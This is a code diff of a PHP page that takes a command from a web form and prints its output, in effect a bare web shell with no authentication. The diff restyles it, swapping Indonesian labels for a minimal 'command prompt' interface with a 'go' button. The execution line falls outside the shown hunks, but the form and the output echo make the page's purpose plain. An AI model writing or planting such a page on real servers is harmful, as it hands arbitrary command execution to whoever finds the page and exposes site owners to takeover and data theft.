@@ -1,14 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Execute Command</title>
+    <title>command prompt</title>
 </head>
 <body>
-    <h1>Execute Command</h1>
+    <center>
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
     <form method="post">
-        <label for="command">Masukkan perintah:</label>
-        <input type="text" name="command" id="command">
-        <input type="submit" value="Jalankan">
+        <label for="command"></label>
+        <input type="text" name="command" id="command" placeholder="command">
+        <input type="submit" value="go">
     </form>
 
     <?php
@@ -18,5 +23,6 @@
         echo "<pre>$output</pre>";
     }
     ?>
+    </center>
 </body>
 </html>
